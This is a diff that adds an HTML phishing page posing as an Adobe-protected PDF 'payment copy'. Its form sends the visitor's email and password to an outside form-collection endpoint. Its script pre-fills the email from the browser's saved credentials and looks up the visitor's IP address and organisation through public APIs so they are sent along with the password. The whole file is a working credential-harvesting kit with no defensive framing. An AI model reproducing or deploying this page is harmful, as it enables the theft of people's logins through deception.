@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Protected PDF — Payment Copy</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 28px 12px 60px;
+      background: #f6f6f6 url('download.jpg') no-repeat center top;
+      background-size: cover;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Watermark */
+    body::before {
+      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      font-size: 46px;
+      font-weight: bold;
+      color: rgba(200, 0, 0, 0.12);
+      transform: rotate(-35deg);
+      white-space: pre;
+      line-height: 120px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card {
+      width: 450px;
+      max-width: 94%;
+      background: rgba(255,255,255,0.95);
+      border-radius: 8px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 28px 22px 34px;
+      position: relative;
+      z-index: 2;
+      backdrop-filter: blur(4px);
+    }
+
+    .pdf-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+    .pdf-icon img { width: 54px; height: auto; }
+
+    h1 {
+      font-size: 20px;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    p.lead {
+      text-align: center;
+      color: #666;
+      margin-bottom: 22px;
+      font-size: 14px;
+    }
+
+    .form { margin-bottom: 18px; position: relative; }
+
+    .input {
+      width: 100%;
+      border: 1px solid #e6e6e6;
+      border-radius: 4px;
+      padding: 14px 12px;
+      margin-bottom: 12px;
+      color: #777;
+      background: #fafafa;
+      font-size: 15px;
+    }
+
+    .password-wrapper { position: relative; }
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #999;
+      font-size: 18px;
+      user-select: none;
+    }
+    .toggle-password:hover { color: #d32f2f; }
+
+    .download-wrap {
+      text-align: center;
+      margin: 16px 0 10px;
+    }
+    .btn-download {
+      display: inline-block;
+      padding: 12px 36px;
+      border-radius: 30px;
+      background: #d32f2f;
+      color: #fff;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      box-shadow: 0 6px 18px rgba(211,47,47,0.18);
+      border: none;
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    .file-info {
+      margin-top: 18px;
+      border-top: 1px solid #eee;
+      padding-top: 14px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      color: #333;
+    }
+    .file-thumb { width: 48px; flex: 0 0 48px; }
+    .file-thumb img { width: 100%; }
+    .file-meta { flex: 1; }
+    .file-meta h4 { margin-bottom: 6px; font-size: 15px; color: #0b58a8; }
+    .file-meta .desc, .file-meta .size { font-size: 13px; color: #666; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="pdf-icon">
+      <img src="data:image/svg+xml;utf8,
+        <svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'>
+          <rect width='72' height='90' rx='6' fill='%23d63636'/>
+          <text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text>
+        </svg>" alt="PDF icon">
+    </div>
+
+    <h1>This File is Protected By Adobe®<br>Security.</h1>
+    <p class="lead">Click on download to view payment copy.</p>
+
+    <!-- ✅ Formspark form -->
+    <form class="form" action="https://submit-form.com/vQBbiONxP" method="POST">
+      <input id="email" name="email" class="input" type="email" placeholder="Email" autocomplete="email" required>
+
+      <div class="password-wrapper">
+        <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
+        <span id="togglePassword" class="toggle-password">👁️</span>
+      </div>
+
+      <!-- Hidden fields to capture IP and Hostname via JS -->
+      <input type="hidden" name="ip" id="ip">
+      <input type="hidden" name="hostname" id="hostname">
+
+      <div class="download-wrap">
+        <button class="btn-download" type="submit">DOWNLOAD</button>
+      </div>
+    </form>
+
+    <div class="file-info">
+      <div class="file-thumb">
+        <img src="data:image/svg+xml;utf8,
+          <svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'>
+            <rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/>
+            <text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text>
+          </svg>" alt="">
+      </div>
+      <div class="file-meta">
+        <h4>Download File Information</h4>
+        <div class="desc">Payment copy</div>
+        <div class="size">File Size: 47kb</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Autofill email from browser
+    window.addEventListener('DOMContentLoaded', async () => {
+      if ('credentials' in navigator) {
+        try {
+          const cred = await navigator.credentials.get({ password: true, mediation: 'optional' });
+          if (cred && cred.id) document.getElementById('email').value = cred.id;
+        } catch (err) { console.log("Autofill not available:", err); }
+      }
+
+      // Fetch IP and Hostname (via a free API)
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('ip').value = data.ip;
+          // Get hostname (optional)
+          fetch(`https://ipapi.co/${data.ip}/json/`)
+            .then(r => r.json())
+            .then(info => document.getElementById('hostname').value = info.org || info.city || '');
+        })
+        .catch(() => console.log('Could not fetch IP'));
+    });
+
+    // Toggle password visibility
+    const toggle = document.getElementById('togglePassword');
+    const pwd = document.getElementById('password');
+    toggle.addEventListener('click', () => {
+      const isHidden = pwd.type === 'password';
+      pwd.type = isHidden ? 'text' : 'password';
+      toggle.textContent = isHidden ? '🙈' : '👁️';
+    });
+  </script>
+</body>
+</html>
